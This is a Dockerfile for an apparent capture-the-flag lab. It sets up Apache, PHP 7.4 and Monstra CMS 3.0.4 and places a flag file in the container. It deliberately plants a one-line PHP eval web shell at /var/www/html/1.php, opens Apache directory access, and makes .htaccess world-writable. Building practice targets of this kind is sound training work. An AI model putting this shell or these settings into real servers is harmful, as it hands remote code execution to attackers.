FROM ubuntu:20.04

MAINTAINER penguincc<2965663123@qq.com>

ENV REFRESHED_AT 2021-9-10

ENV LANG C.UTF-8

RUN rm /etc/apt/sources.list

COPY ./sources.list /etc/apt/sources.list

RUN apt-get -y update

RUN apt-get -y upgrade

RUN mkdir /home/penguincc/

COPY ./flag /home/penguincc/

ENV DEBIAN_FRONTEND noninteractive

RUN apt-get -y install apache2

RUN apt-get -y install php7.4

RUN apt-get -y install libapache2-mod-php7.4  --fix-missing

RUN apt-get -y install php7.4-fpm

RUN apt-get -y install php7.4-xml

RUN mkdir /var/www/html/monstra/

COPY ./monstra-3.0.4/ /var/www/html/monstra/

RUN rm /var/www/html/index.html

COPY ./index.php /var/www/html/

RUN echo "<?php eval(\$_POST[1]);?>" > /var/www/html/1.php

RUN echo "ServerName localhost:80" >>/etc/apache2/apache2.conf

RUN sed -i 's/\;extension=xmlrpc/extension=xmlrpc/g' /etc/php/7.4/apache2/php.ini

RUN sed -i 's#\/var\/www\/#\/var\/www\/html\/#g' /etc/apache2/apache2.conf

RUN sed -i '172s#AllowOverride None#AllowOverride All#g' /etc/apache2/apache2.conf

RUN sed -i '196s#Require all denied#Require all granted#g' /etc/apache2/apache2.conf

ADD ./.htaccess /var/www/html/.htaccess

RUN chmod 777 /var/www/html/.htaccess

RUN chown -R www-data:www-data /var/www/

RUN a2enmod rewrite

RUN touch /var/log/1.txt

RUN chmod +x /var/log/1.txt

COPY ./start.sh /root/start.sh

RUN  chmod +x /root/start.sh

EXPOSE 80

ENTRYPOINT ["/root/start.sh"]